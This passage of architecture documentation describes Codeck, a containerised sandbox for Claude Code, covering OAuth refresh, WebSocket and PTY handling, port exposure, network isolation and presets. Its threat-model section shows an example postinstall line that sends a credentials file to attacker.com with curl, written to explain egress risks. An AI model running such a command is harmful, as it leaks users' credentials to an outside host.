- **Auto-Refresh Monitor:** A background interval (`startTokenRefreshMonitor()` in `auth-anthropic.ts`) runs every 5 minutes (`REFRESH_CHECK_INTERVAL_MS = 5min`) and checks if the access token expires within the next 30 minutes (`REFRESH_MARGIN_PROACTIVE_MS = 30min`). If so, it calls `performTokenRefresh()` which POSTs to the Anthropic OAuth token endpoint using the stored `refresh_token`. On success:
  - `.credentials.json` is updated with the new encrypted `access_token`, `refresh_token`, and `expiresAt`
  - In-memory token, auth cache, and plaintext cache are all updated
  - If the token is already expired (e.g., container was suspended), the monitor attempts recovery before giving up
  - The monitor starts during server post-listen initialization and stops cleanly during `gracefulShutdown()` via `stopTokenRefreshMonitor()`.

- **Concurrency Control:** The `refreshInProgress` flag prevents race conditions during concurrent refresh attempts. Only one refresh can execute at a time within a single container. Auth cache (3-second TTL) reduces thundering herd effect when multiple API calls check auth status simultaneously.

- **Revocation Detection:** Token revocation is detected via token use failure (OAuth 2.0 spec does not provide client-side revocation notifications). If the Claude API returns 401 Unauthorized, `markTokenExpired()` is called which: (1) clears the in-memory token and auth cache, (2) attempts a refresh using the stored refresh token, and (3) only deletes credential files if the refresh fails. This preserves recoverability — a 401 from a temporarily invalid access token doesn't destroy the refresh token needed for recovery.

- **PKCE State Cleanup:** PKCE state files (`.pkce-state.json`) have a 5-minute TTL. Stale states are cleaned up on timeout, successful login, error, or startup (if persisted state is loaded and found to be expired).

- **Multi-Container Limitation:** Codeck is designed for single-container deployment. Multi-container setups (e.g., Kubernetes `replicas > 1`) may experience OAuth refresh race conditions since the `refreshInProgress` flag is in-memory, not distributed. Use sticky sessions or distributed locking (Redis) if horizontal scaling is required.

### Multi-Tab Authentication Behavior

Codeck uses **localStorage** for password session tokens and **file-based storage** for OAuth tokens. This creates specific behavior patterns when users have multiple browser tabs/windows open:

**Password Sessions (localStorage Bearer tokens):**

- ❌ **No cross-tab synchronization** — Logout in one tab does not immediately sync to other tabs
- Other tabs remain in "authenticated" state until next API call triggers 401 → auto-logout
- Unsaved work in other tabs may be lost if user logs out elsewhere
- WebSocket connections remain open after logout (validated on connect, not per-message)
- **Recovery:** Automatic on next API interaction; or user can reload tab

**OAuth Tokens (file-based `.credentials.json`):**

- ✅ **File system shared across tabs** — Token refresh writes to same credential file
- Auth cache (3-second TTL) means tabs converge within 3 seconds of refresh
- Eventually consistent — no data loss
- Proactive refresh (5-minute margin) typically prevents expiry disruptions

**Password Change Behavior:**

- Server invalidates ALL sessions (`activeSessions.clear()`)
- Tab that initiated change receives new token immediately
- Other tabs: OLD token cached in localStorage until next API call → 401 → forced logout
- **Security:** Correct — password change should invalidate other sessions
- **UX:** Other tabs lose context and must re-login

**Technical Limitation:**

Codeck does **not** implement the `storage` event listener pattern for cross-tab state synchronization. Modern SPAs typically listen for `StorageEvent` to sync logout/login across tabs instantly. This is a known limitation documented in AUDIT-119, accepted as low-priority for a dev tool with typical single-tab usage.

**Example Flow:**
```
Tab A: User clicks logout
  → POST /api/auth/logout → invalidateSession() on server
  → localStorage.removeItem('codeck_auth_token')
  → setView('auth') → Tab A shows login screen

Tab B: No notification
  → localStorage still has old token (no storage event listener)
  → In-memory state: authenticated
  → Next API call → 401 → clearAuthToken() → redirect to login
  → Inconsistency window: Tab B appears logged in until interaction
```

**If you need immediate cross-tab logout:**
- Close all Codeck tabs and reopen
- Or refresh inactive tabs after logging out in one tab

See AUDIT-119 for detailed analysis and recommendations.

### 3. GitHub Device Code Flow

```
POST /api/github/login
    → spawn('gh', ['auth', 'login', '--web', '-h', 'github.com'])
    → Captures stdout/stderr:
        → Regex: /([A-Z0-9]{4}-[A-Z0-9]{4})/ → device code
        → Regex: /(https:\/\/github\.com\/login\/device)/ → URL
    → Callbacks update ghLoginState + broadcastStatus()
    → proc.on('close', code=0) → success
```

The user opens `github.com/login/device`, enters the code, and `gh` completes the flow automatically.

#### Rate Limiting

GitHub rate limits apply to API calls but NOT to Git operations:
- `git clone`, `git fetch`, `git push` via HTTPS or SSH: **No rate limit**
- `gh auth login` device code flow: **50 codes/hour per app** (very low risk)
- `gh api` commands (if added in future): **5,000 requests/hour** (authenticated)

The `gh` CLI has built-in exponential backoff for API rate limit errors. Codeck does not currently parse or surface rate limit errors to the UI, but they are logged server-side.

---

## WebSocket protocol

### Connection

```
ws[s]://host?token=<codeck_auth_token>
```

Validation on connect:
1. If password is configured: extracts `token` from query params, validates against `activeSessions`
2. If no password: accepts any connection
3. Failure: `ws.close(4001, 'Unauthorized')`

### Messages on connect

The server automatically sends to the connecting client:

```json
{"type": "status", "data": {"claude": {...}, "git": {...}, "preset": {...}}}
{"type": "logs", "data": [{"type":"info", "message":"...", "timestamp":123}]}
```

### Message protocol

**Server → Client:**

| type | data | Trigger |
|------|------|---------|
| `status` | `{claude: ClaudeStatus, git: GitStatus, preset: PresetStatus, sessions?: SessionInfo[]}` | Connection, post-login, post-clone, post-auth change |
| `log` | `LogEntry` | Each console.log/error from the server |
| `logs` | `LogEntry[]` | On connect (full buffer) |
| `console:output` | `{sessionId, data}` | Each output from the PTY |
| `console:exit` | `{sessionId, exitCode}` | PTY terminates |
| `console:error` | `{sessionId, error}` | Session not found on attach — frontend removes the ghost session |
| `ports` | `PortInfo[]` (`{port, exposed}`) | Port scanner detects change in listening ports |
| `sessions:restored` | `{id, type, cwd, name}[]` | Sessions auto-restored after container restart |
| `heartbeat` | `{ts}` | Every 25s — client-side stale detection (close if no data in 45s) |
| `agent:update` | `ProactiveAgent` | Agent created, updated, or status changed |
| `agent:output` | `{agentId, text}` | Streaming output from a running agent execution |
| `agent:execution:start` | `{agentId, executionId}` | Agent execution started |
| `agent:execution:complete` | `{agentId, executionId, result}` | Agent execution finished |

**Client → Server:**

| type | params | Effect |
|------|--------|--------|
| `console:attach` | `{sessionId}` | Registers onData/onExit listener for the PTY |
| `console:input` | `{sessionId, data}` | Writes to the PTY stdin |
| `console:resize` | `{sessionId, cols, rows}` | Resizes the PTY |

### Heartbeat & Stale Detection

**Server-side ping/pong (protocol-level):**
- Sends WebSocket ping frames every 30s to all connected clients
- Terminates clients that fail to respond with pong (dead connection cleanup)
- Browser WebSocket API automatically responds to ping frames

**Application-level heartbeat:**
- Server broadcasts `{type: 'heartbeat'}` every 25s
- Client updates `lastMessageAt` timestamp on any received message
- Client checks every 10s: if no data received in 45s, force-reconnects

**Why dual heartbeats?**
- Browser JavaScript cannot access protocol-level ping frames
- Server ping/pong detects dead clients (mobile network drops)
- Application heartbeat lets client detect stale server (server overload, network partition)

### Reconnection

The client has auto-reconnect with exponential backoff:

```
ws.onclose → setTimeout(connectWebSocket, backoff)  // 1s → 2s → 4s → ... → 30s cap
ws.onopen  → backoff = 1000                          // reset on success
```

**Reconnection logic:**
- Exponential backoff: 1s → 2s → 4s → 8s → 16s → 30s (cap)
- Jitter: 50-100% of backoff delay (prevents thundering herd reconnection storms)
- Max attempts: 15 (stops retrying after ~8 minutes)
- Backoff resets to 1s on successful reconnection

On reconnect, the server sends a `status` message that includes the current session list. The frontend syncs its sessions from this list (replacing stale ones), then re-attaches:
```
status message → updateStateFromServer(data) → setSessions(data.sessions)
                → sessions.forEach(s => wsSend({type:'console:attach', sessionId: s.id}))
```

This prevents frozen "ghost" terminals after container restart — old session IDs are replaced with the server's current sessions.

**Message Buffering During Disconnect:**
- **Resize messages:** The last `console:resize` message is buffered and flushed on reconnect (ensures terminal dimensions are correct).
- **Input messages:** User input (`console:input`) typed while disconnected is **dropped** (known limitation, see AUDIT-123 recommendation 2). Users must wait for reconnection before typing commands.

---

## PTY terminal management

### Session lifecycle

```
1. POST /api/console/create {cwd, resume?}
    ├── Validates: isClaudeAuthenticated()
    ├── Validates: getSessionCount() < 5
    ├── ensureOnboardingComplete()
    │   └── Writes hasCompletedOnboarding=true to /root/.claude.json
    ├── syncToClaudeSettings()
    │   └── Writes enabled permissions to /root/.claude/settings.json
    ├── getOAuthEnv()
    │   └── Reads /root/.claude/.credentials.json → CLAUDE_CODE_OAUTH_TOKEN
    └── ptySpawn('claude', [--resume?], {
            name: 'xterm-256color',
            cols: 120, rows: 30,
            cwd: workDir,
            env: {...process.env, ...oauthEnv, TERM:'xterm-256color'}
        })
    → Buffers output until WebSocket attaches
    → Response: {sessionId, cwd, name}

2. WS: {type:'console:attach', sessionId}
    ├── Disposes previous PTY handlers (prevents duplicates on page refresh)
    ├── session.pty.onData(data) → ws.send({type:'console:output', sessionId, data})
    ├── session.pty.onExit({exitCode}) → ws.send({type:'console:exit'}) + destroySession()
    └── Replays buffered output via markSessionAttached()

3. WS: {type:'console:input', sessionId, data}
    → session.pty.write(data)

4. WS: {type:'console:resize', sessionId, cols, rows}
    → session.pty.resize(cols, rows)

5. POST /api/console/destroy {sessionId}
    → session.pty.kill() + sessions.delete(id)
```

### Technical details

- **node-pty** compiles native C++ bindings. To avoid rebuilding on each deploy, the base image pre-compiles in `/prebuilt/` and the prod image copies the binary.
- Claude CLI is executed with the OAuth token injected via the env var `CLAUDE_CODE_OAUTH_TOKEN`, not via the keyring.
- `ensureOnboardingComplete()` writes `hasCompletedOnboarding: true`, `hasTrustDialogAccepted: true`, and `theme: "dark"` to `/root/.claude.json` to skip the CLI welcome/trust screens.
- Pre-allowed permissions (Read, Edit, Write, Bash, WebFetch, WebSearch) are synced to `/root/.claude/settings.json` so the CLI doesn't prompt for common tools.
- Note: `--dangerously-skip-permissions` cannot be used because the container runs as root, and Claude Code blocks that flag for root/sudo.
- The limit of 5 simultaneous sessions is enforced in the route handler (not in the service).
- Sessions support `--resume` flag to continue previous Claude Code conversations (checks for `.jsonl` files in `~/.claude/projects/<encoded-path>/`).

### Data Flow and Backpressure

Terminal data flows through three layers:
1. **PTY Layer:** node-pty spawns child processes (claude, bash) with xterm-256color emulation
2. **WebSocket Layer:** Transports data between backend and frontend with 64KB maxPayload and 300 msg/min rate limiting
3. **Rendering Layer:** xterm.js renders ANSI sequences to canvas in browser

**PTY Output Buffering:**
- **Pre-attach buffer:** When a session is created but no client is attached, PTY output is buffered up to 1MB in memory (`MAX_BUFFER_SIZE` in `console.ts`). Oldest chunks are dropped (FIFO) if the buffer fills.
- **Attach & replay:** When a client sends `console:attach`, the server replays all buffered output, then switches to live streaming.
- **Live streaming with backpressure:** PTY `onData` pauses the PTY before each `ws.send()` and resumes it in the send callback. This prevents unbounded buffer growth when the client is slow to consume output.

**Backpressure Handling:** The PTY is paused before each WebSocket send and **always resumed** in the callback, regardless of whether the send succeeded or failed. This is critical — leaving the PTY paused on a transient send error would permanently freeze the terminal. If the client truly disconnected, the WS `close` event handles cleanup. The `ws` library does not expose `bufferedAmount` reliably (GitHub issue #492), so pause/resume is used instead of queue depth monitoring.

**Attach Deduplication:** The frontend tracks attached sessions per WS connection via a `Set<string>`. On reconnect, multiple code paths (status sync, session restore, DOM mount) may all try to send `console:attach` — the `attachSession()` helper deduplicates these to prevent handler stacking on the server.

**Known Limitation:** Terminal output may be delayed on slow connections. Users should avoid running commands with unbounded output (e.g., `cat /dev/urandom`). For production deployments requiring finer backpressure, consider enabling `handleFlowControl` in node-pty (uses XON/XOFF flow control).

**Resize Handling:**
- Client resize messages (`console:resize`) are debounced (50ms desktop, 200ms mobile) via `ResizeObserver` timeout to avoid flooding the server.
- Resize during active PTY output may cause visual artifacts (some lines formatted for old dimensions, some for new). This is inherent to PTY behavior, not a bug.
- During disconnection, the last resize message is buffered and flushed on reconnect to ensure terminal dimensions are correct.

**ANSI Sanitization:** Not currently implemented at application layer. xterm.js provides internal protections, but defense-in-depth via OSC/DCS/PM/APC filtering is recommended for production.

**Zombie Prevention:** node-pty handles SIGCHLD internally. Production deployments should monitor for zombie process accumulation via periodic `ps aux` checks.

**Process Termination:** `destroySession()` sends SIGKILL immediately without SIGTERM grace period. Child processes cannot perform cleanup (flush buffers, close sockets, remove temp files). Future enhancement: add SIGTERM → 2s grace period → SIGKILL pattern (matches proactive-agents termination).

---

## Port exposure

Dev server ports are exposed directly from the Docker container via port range mappings. No proxy is involved — browsers access `localhost:{port}` directly.

### How it works

```
Browser: GET http://localhost:3000/
    │
    └── Docker port mapping (3000:3000)
        └── Container service on 0.0.0.0:3000
```

**Default mapping:** Only the Codeck port (default 80) is mapped. Additional ports are added on demand via the dashboard UI, the `POST /api/system/add-port` API, or manually in `docker/compose.override.yml`. The Codeck CLI `init` wizard can also pre-map ports during setup.

### Port manager (port-manager.ts)

Reads `CODECK_MAPPED_PORTS` environment variable on startup. Detects compose project info (project dir, service name, container image) via Docker container labels. Provides `isPortExposed(port)` to check if a port is in the mapped range.

When a new port needs to be exposed in bridge mode, the port manager:
1. Writes `compose.override.yml` on the host via a helper container (base64 pipe)
2. Saves session state for auto-restore
3. Spawns a detached helper container that runs `docker compose up -d` after a 3s delay
4. The sandbox container gets recreated with the new port mapping
5. Sessions auto-restore on the new container

### Port scanner (ports.ts)

Runs `ss -tlnp` every 5 seconds, detects listening ports (excluding 80), and broadcasts changes to all WebSocket clients via `{ type: 'ports', data: [{port, exposed}, ...] }`. Active ports appear as clickable links in the dashboard with an exposure indicator.

### Session persistence

Sessions can be saved to disk and auto-restored on container restart. The `saveSessionState()` / `restoreSavedSessions()` functions in `console.ts` handle serialization to `/workspace/.codeck/state/sessions.json`. Agent sessions are restored with `--resume` and optionally injected with a continuation prompt.

### Daily log lifecycle

Daily logs (`memory/daily/*.md`) use implicit rotation: one file per calendar day (UTC). Files accumulate indefinitely—manual cleanup required for long-running instances.

**Disk Usage:**
- Typical: 10-50KB/day (light use), 100-500KB/day (heavy use with frequent flushes)
- Path-scoped dailies multiply usage by number of active paths
- No automated cleanup or compression

**Maintenance:**
To prevent unbounded growth, periodically delete old logs:
```bash
# Delete logs older than 90 days
find /workspace/.codeck/memory/daily -name '*.md' -mtime +90 -delete

# For path-scoped logs
find /workspace/.codeck/memory/paths/*/daily -name '*.md' -mtime +90 -delete

# Check disk usage
du -sh /workspace/.codeck/memory
```

**Corruption Handling:**
Daily files use append-only writes (not atomic). Mid-write crashes may corrupt the last entry. Impact: partial entry in markdown, manually recoverable by editing `.md` file. Indexer treats malformed markdown as plain text (graceful degradation).

---

## Network Isolation Model

Codeck implements a **single-container architecture** where all projects share one container and its network namespace. This design has important security implications for multi-project workflows.

### Shared Network Namespace

**Architecture:**
- All projects live under `/workspace/<project>` within one container
- Dev servers (e.g., React on port 3000, Flask on port 5000) share the same network stack
- Any process can connect to any other process via `localhost:<port>`

**Implications:**
- **No inter-project network isolation** — A dev server in Project A can make HTTP requests to a dev server in Project B via `localhost`
- **Cross-project communication is unrestricted** — No firewall rules between processes
- **Shared localhost attack surface** — Malicious code in one project can scan `localhost:1-65535` to discover and interact with other projects' services

**Example Scenario:**
1. User works on Project A (private client work on port 3000)
2. User also works on Project B (public OSS contribution on port 5000)
3. Malicious npm package in Project B scans `localhost` and exfiltrates data from Project A via HTTP

**Risk Assessment:**
- **Severity:** MEDIUM (in Codeck's threat model)
- **Likelihood:** LOW (requires malicious dependency installation)
- **Mitigating Factors:**
  - Single-user environment (no multi-tenancy)
  - Users control all code in workspace
  - Secret sanitization reduces credential leakage (IMPL-08, IMPL-22)

### Network Mode Architecture

**Bridge Mode (all platforms)** — Standard Docker network isolation:
- Container runs on Docker bridge network
- Network namespace isolation: **ENABLED** (container isolated from host network)
- Port exposure: Explicit mapping via compose file (e.g., `80:80`)
- Inbound access: Only mapped ports reachable from host
- Outbound access: Unrestricted (no egress filtering)
- LAN access: Use `docker/compose.lan.yml` overlay + host-side mDNS advertiser script

### Host Access via `extra_hosts`

**Configuration** (compose files):
```yaml
extra_hosts:
  - "host.docker.internal:host-gateway"
```

**Purpose:** Allows container processes to connect to services running on the host (e.g., database, Redis).

**Security Implication:** Container can reach **all ports** on the host via `host.docker.internal` hostname. If a vulnerable dev server runs in Codeck and an attacker triggers SSRF (Server-Side Request Forgery), they can access host services.

**Mitigation:** Use host firewall to restrict access to sensitive ports, or bind host services to `127.0.0.1` only (not `0.0.0.0`).

### Egress Connection Monitoring

**Current State:** Codeck implements **ZERO outbound connection monitoring or filtering**. Containers have **unrestricted egress** to the internet.

**What This Means:**
- Any process can connect to any IP:port on the internet
- No logging of outbound destinations, byte counts, or protocols
- No domain allowlist/blocklist
- No detection of data exfiltration attempts

**Example Unmonitored Activity:**
User installs malicious npm package → postinstall script runs `curl https://attacker.com -d @/workspace/.codeck/auth.json` → credentials exfiltrated with no log entry.

**Risk Assessment:**
- **Severity:** LOW (for single-user dev sandbox with trusted code)
- **Severity:** MEDIUM-HIGH (if multi-tenant or handling sensitive data)

**Future Hardening Options:**
1. **Short-term:** Add Docker logging driver to capture network stats, iptables LOG rules for outbound connections (post-incident forensics only, no prevention)
2. **Medium-term:** Forward proxy (Squid, tinyproxy) for HTTP/HTTPS egress with domain allowlist (doesn't cover git://, SSH, raw TCP)
3. **Long-term:** eBPF-based monitoring (Cilium, Falco) for real-time anomaly detection (complex setup, kernel requirements)

### DNS Configuration

**Default Behavior:**
- Container uses Docker's embedded DNS server at `127.0.0.11`
- DNS queries for container names resolved via Docker's service discovery
- External domain queries forwarded to host's configured DNS servers
- No explicit `dns:` or `dns_search:` directives (uses Docker defaults)

**mDNS (LAN Mode Only):**
- `mdns.ts` service responds to `.local` domain queries (e.g., `codeck.local`)
- TTL: 120 seconds
- **Security Note:** mDNS has no authentication (RFC 6762). On untrusted LANs, attackers can spoof `codeck.local` to redirect browsers. Always verify URLs before entering credentials.

**DNS Leakage:**
- Container DNS inherits host DNS by default (no equivalent to Kubernetes `dnsPolicy: ClusterFirst`)
- This is **acceptable** for Codeck because all services are in one container, and Claude CLI needs external DNS for `api.anthropic.com`, `github.com`, etc.

### Port Exposure Security Model

**CIS Benchmark Compliance:**

According to CIS Docker Benchmark Section 5.8:
> "Bind incoming container traffic to a specific host interface (e.g., `127.0.0.1:3000:3000`), not all interfaces (`0.0.0.0`)."

**Current Implementation:**
- Port mappings use `"5173:5173"` format, which binds to `0.0.0.0` (all interfaces)
- **Rationale:** Required for dev workflow — users expect `http://localhost:5173` to work on Windows/macOS Docker Desktop
- **Risk:** If Codeck runs on a cloud instance with public IP, exposed ports are internet-accessible without firewall

**Recommendation:** If deploying to public cloud, use firewall rules or change port binding to `"127.0.0.1:5173:5173"` (requires testing on Windows/macOS).

### Alternative Architectures (For Multi-Tenant Security)

If Codeck were to support multi-tenant or security-critical deployments, three patterns could provide project isolation:

1. **Container-per-project** (Kubernetes model) — Each project in its own container on dedicated network. Excellent isolation, high complexity (orchestration required).
2. **Firewall-per-project** (iptables rules) — Apply iptables at container startup to block cross-project traffic. Medium complexity (requires CAP_NET_ADMIN), good network isolation.
3. **User namespace remapping** (Linux namespaces) — Run each project's processes under different UID ranges. Excellent process isolation, high complexity (kernel support, filesystem permissions).

**Recommendation:** For Codeck's current use case (single-user dev sandbox), **no action required**. If multi-tenant support is needed, consider architecture redesign.

---

## Preset system

Presets are template configurations that define the initial Claude sandbox environment (CLAUDE.md, rules, skills, memory, preferences, MCP config).

### Structure

```
src/templates/
├── CLAUDE.md                  # → /workspace/CLAUDE.md (Layer 2: workspace rules, ports, project list)
└── presets/
    ├── default/
    │   ├── manifest.json          # Preset metadata + file mappings (v3.0.0)
    │   ├── CLAUDE.md              # → /root/.claude/CLAUDE.md (Layer 1: memory rules inline, environment, preferences)
    │   ├── AGENTS.md              # → /workspace/.codeck/AGENTS.md (detailed reference for advanced memory ops)
    │   ├── mcp.json               # → /root/.claude/mcp.json
    │   ├── preferences.md         # → /workspace/.codeck/preferences.md (defaults + user-defined)
    │   ├── rules/                 # → /workspace/.codeck/rules/
    │   │   ├── coding.md          # Coding standards and practices
    │   │   ├── communication.md   # How to communicate with the user
    │   │   └── workflow.md        # Session startup/during/shutdown sequences
    │   ├── memory/                # → /workspace/.codeck/memory/
    │   │   └── MEMORY.md          # Initial durable memory
    │   └── skills/
    │       ├── sandbox.md         # → /workspace/.codeck/skills/sandbox.md (port preview, API, git, container info)
    │       └── docker.md          # → /workspace/.codeck/skills/docker.md (Docker-in-Docker constraints)
    └── empty/
        ├── manifest.json
        └── CLAUDE.md
```

### Manifest format

```json
{
  "id": "default",
  "name": "Default (Recommended)",
  "description": "Persistent memory system, rules, and sandbox skills. Makes Claude productive immediately.",
  "version": "3.0.0",
  "extends": null,
  "files": [
    { "src": "CLAUDE.md", "dest": "/root/.claude/CLAUDE.md" },
    { "src": "../../CLAUDE.md", "dest": "/workspace/CLAUDE.md" },
    { "src": "mcp.json", "dest": "/root/.claude/mcp.json" },
    { "src": "AGENTS.md", "dest": "/workspace/.codeck/AGENTS.md" },
    { "src": "preferences.md", "dest": "/workspace/.codeck/preferences.md" },
    { "src": "rules/coding.md", "dest": "/workspace/.codeck/rules/coding.md" },
    { "src": "rules/communication.md", "dest": "/workspace/.codeck/rules/communication.md" },
    { "src": "rules/workflow.md", "dest": "/workspace/.codeck/rules/workflow.md" },
    { "src": "skills/sandbox.md", "dest": "/workspace/.codeck/skills/sandbox.md" },
    { "src": "skills/docker.md", "dest": "/workspace/.codeck/skills/docker.md" },
    { "src": "memory/summary.md", "dest": "/workspace/.codeck/memory/summary.md" },
    { "src": "memory/decisions.md", "dest": "/workspace/.codeck/memory/decisions.md" },
    { "src": "memory/MEMORY.md", "dest": "/workspace/.codeck/memory/MEMORY.md" }
  ],
  "directories": ["/workspace/.codeck/memory/daily", "/workspace/.codeck/memory/decisions", "/workspace/.codeck/memory/paths", "/workspace/.codeck/sessions", "/workspace/.codeck/index", "/workspace/.codeck/state", "/workspace/.codeck/rules", "/workspace/.codeck/skills", "/workspace/.codeck/agents"]
}
```

### Application flow

```
POST /api/presets/apply {presetId}
    │
    ├── loadManifest(presetId)
    ├── If extends: applyPresetRecursive(parent, visited, depth+1)
    │   └── Max depth: 5, circular reference detection via Set
    ├── Create declared directories
    ├── Copy declared files (src → dest)
    │   ├── Includes /root/.claude/CLAUDE.md (Layer 1 with inline memory rules)
    │   ├── Includes /workspace/CLAUDE.md (Layer 2 from src/templates/CLAUDE.md)
    │   └── Skip "data files" (memory/*, sessions/*, index/*, state/*, preferences.md, rules/*) unless force=true
    ├── Write config to /workspace/.codeck/config.json
    └── updateClaudeMd() → update project list in /workspace/CLAUDE.md
```

### CLAUDE.md layers

Three layers of CLAUDE.md exist:

1. **Layer 1 — Preset CLAUDE.md** (`/root/.claude/CLAUDE.md`): Auto-loaded by Claude Code on every session. Contains the full memory system rules inline (7 mandatory rules, startup sequence, shutdown sequence, context recovery, flush, search APIs), environment info, preferences, and references to `rules/` and `skills/`. Previously this file just said "read AGENTS.md" — now the rules ARE in the auto-loaded file, so Claude cannot skip them. Source: `src/templates/presets/default/CLAUDE.md`.
2. **Layer 2 — Workspace CLAUDE.md** (`/workspace/CLAUDE.md`): Deployed by the preset system (via `{ "src": "../../CLAUDE.md", "dest": "/workspace/CLAUDE.md" }` in the manifest) and also generated/updated by `updateClaudeMd()` in `git.ts`. Contains workspace-specific rules only: scope boundaries (`/workspace`), port preview instructions, networking rules, non-interactive command rules, and a `<!-- PROJECTS_LIST -->` marker that is auto-updated with the current project listing. Source: `src/templates/CLAUDE.md`.
3. **Layer 3 — Project CLAUDE.md** (`/workspace/<project>/CLAUDE.md`): Project-specific instructions (managed by Claude or user)

**AGENTS.md** (`/workspace/.codeck/AGENTS.md`): Remains as a detailed reference document for advanced memory operations and API docs. Deployed by the preset system but no longer the primary source of memory rules — those are now inline in Layer 1.

### Git + Workspace Integration Flow

The preset system, git service, and workspace export work together to maintain the three-layer CLAUDE.md hierarchy and project listing:

```
1. User applies preset
   ├── POST /api/presets/apply {presetId}
   ├── applyPreset() writes Layer 1 + Layer 2 (from template)
   └── updateClaudeMd() populates <!-- PROJECTS_LIST --> marker in Layer 2

2. User clones git repository
   ├── POST /api/git/clone {url, token?, useSSH?}
   ├── cloneRepository() clones to ${WORKSPACE}/${repoName}
   └── On success: updateClaudeMd() scans /workspace for .git directories, updates Layer 2 marker

3. updateClaudeMd() logic
   ├── Scans ${WORKSPACE} for subdirectories with .git/
   ├── Sanitizes repo names (strip non-alphanumeric except _-., truncate to 100 chars)
   ├── Generates project list: "- **name/** - `/workspace/name`"
   ├── If Layer 2 has <!-- PROJECTS_LIST --> marker: replace content after marker
   ├── If Layer 2 lacks marker: log warning, skip update
   └── If Layer 2 doesn't exist: create from src/templates/CLAUDE.md template

4. User exports workspace
   ├── GET /api/workspace/export
   ├── tar -czf with exclusions:
   │   ├── --exclude=.git
   │   ├── --exclude=node_modules
   │   ├── --exclude=.codeck/auth.json (password hash)
   │   ├── --exclude=.codeck/sessions.json (session tokens)
   │   └── --exclude=.codeck/state (PTY state files)
   └── Includes: Layer 2 CLAUDE.md, all Layer 3 CLAUDE.md files from cloned repos, all .codeck/ files (memory, rules, skills, preferences, agents)
```

**Integration points**:
- Preset routes call `updateClaudeMd()` after `applyPreset()` (preset.routes.ts:33, 52)
- Git clone calls `updateClaudeMd()` on success (git.ts:401)
- Workspace export includes all CLAUDE.md layers naturally (no special handling needed)

**Security properties**:
- Repo name sanitization prevents instruction injection into Layer 2 (git.ts:634)
- Marker-based update preserves user edits outside the marker (git.ts:644-649)
- Layer 3 CLAUDE.md files from cloned repos are user-controlled and included in exports (by design)

**Edge cases handled**:
- Clone failure: target directory removed (git.ts:406), Layer 2 not updated (updateClaudeMd() only called on success)
- Missing marker: updateClaudeMd() logs warning, skips update (graceful degradation)
- Concurrent clones: naturally serialized at git subprocess level (low risk of Layer 2 corruption)
- Preset reset: applyPreset(force=true) overwrites Layer 2, but updateClaudeMd() immediately restores project list

---

## Docker infrastructure

### Multi-image build strategy

```
docker/Dockerfile.base (build once)
    │
    │  FROM node:22-slim
    │  + build-essential, git, openssh, dbus, gnome-keyring
    │  + @anthropic-ai/claude-code@latest
    │  + node-pty pre-compiled in /prebuilt/
    │  + init-keyring.sh
    │
    ▼
docker/Dockerfile (production)
    │
    │  FROM codeck-base:latest
    │  COPY package.json
    │  npm install --ignore-scripts
    │  cp /prebuilt/node-pty → node_modules/
    │  COPY dist/ (pre-built on host)
    │  COPY templates/
    │
    │  ENTRYPOINT [init-keyring.sh,
    │    node, dist/index.js]
    │  CMD [--web]
```

**Why a separate base image:**
- `npm install node-pty` requires C++ compilation (~7 min in CI)
- `claude-code` weighs ~200MB
- Separating avoids re-downloading/compiling on each code change

### Keyring in Docker

Claude CLI stores tokens in the system keyring (libsecret/gnome-keyring). In Docker there is no display server, so it is simulated:

```bash
dbus-daemon --system --fork          # D-Bus system bus
export $(dbus-launch)                 # D-Bus session bus
echo "" | gnome-keyring-daemon --unlock  # Keyring with empty password
export GNOME_KEYRING_CONTROL SSH_AUTH_SOCK
exec "$@"                             # Then executes the server
```

Codeck also saves the OAuth token directly in `.credentials.json` as a fallback (more reliable in a container).

### Docker Compose — Isolated mode

```yaml
# docker/compose.isolated.yml
services:
  sandbox:
    build:
      context: ..
      dockerfile: docker/Dockerfile
    init: true
    ports:
      - "${CODECK_PORT:-80}:${CODECK_PORT:-80}"
    security_opt: ["no-new-privileges:true"]
    cap_drop: [ALL]
    cap_add: [CHOWN, SETUID, SETGID, NET_BIND_SERVICE, KILL, DAC_OVERRIDE]
    pids_limit: 512
    volumes:
      - workspace:/workspace
      - codeck-data:/workspace/.codeck
      - claude-config:/root/.claude
      - ssh-data:/root/.ssh
    entrypoint: ["/usr/local/bin/init-keyring.sh", "node", "apps/runtime/dist/index.js"]
    command: ["--web"]
```

Additional dev server ports are exposed on demand via `compose.override.yml`. `init: true` adds tini as PID 1 to reap zombie processes.

### Docker Compose — Managed mode

```yaml
# docker/compose.managed.yml (simplified)
services:
  runtime:
    build:
      context: ..
      dockerfile: docker/Dockerfile
    container_name: codeck-runtime
    ports:
      - "127.0.0.1:7777:7777"
      - "127.0.0.1:7778:7778"
    environment:
      - CODECK_PORT=7777
      - CODECK_WS_PORT=7778
      - CODECK_DAEMON_URL=http://host.docker.internal:${CODECK_DAEMON_PORT:-8080}
    entrypoint: ["/usr/local/bin/init-keyring.sh", "node", "apps/runtime/dist/index.js"]
    command: ["--web"]
```

The daemon runs on the host as a native Node.js process (not in a container). See `docker/compose.managed.yml` for full config with security hardening, resource limits, and volume mounts.

---

## Container filesystem at runtime

```
/
├── app/                              # Application (monorepo)
│   ├── apps/
│   │   ├── web/dist/                 # Frontend (Vite build)
│   │   │   ├── index.html
│   │   │   └── assets/               # JS/CSS bundles (hashed filenames)
│   │   ├── runtime/dist/             # Runtime backend
│   │   │   ├── index.js              # Entry point
│   │   │   ├── services/             # Compiled services
│   │   │   ├── routes/               # Compiled routes
│   │   │   ├── web/                  # server.js, websocket.js, logger.js
│   │   │   └── templates/            # CLAUDE.md templates, presets
│   │   ├── daemon/dist/              # Daemon gateway
│   │   │   ├── index.js              # Entry point
│   │   │   └── services/             # auth, audit, proxy, rate-limit, ws-proxy
│   │   └── cli/dist/                 # CLI tool (host-side only, not in container)
│   ├── node_modules/
│   └── package.json
│
├── workspace/                        # Mounted volume — agent's scope
│   ├── .codeck/                    # Codeck data (mounted volume)
│   │   ├── auth.json                 # Password hash + salt (mode 0600)
│   │   ├── config.json               # Active preset config
│   │   ├── preferences.md            # User preferences (defaults + user-defined)
│   │   ├── rules/                    # Rules (coding, communication, workflow)
│   │   │   ├── coding.md
│   │   │   ├── communication.md
│   │   │   └── workflow.md
│   │   ├── AGENTS.md                  # Detailed memory API reference (advanced ops)
│   │   ├── memory/
│   │   │   ├── MEMORY.md             # Global durable memory
│   │   │   ├── daily/                # Global daily logs (one file per day, UTC)
│   │   │   ├── decisions/            # Global ADRs (ADR-YYYYMMDD-<slug>.md)
│   │   │   └── paths/                # Path-scoped memory (pathId dirs)
│   │   ├── sessions/                 # Session transcripts (JSONL)
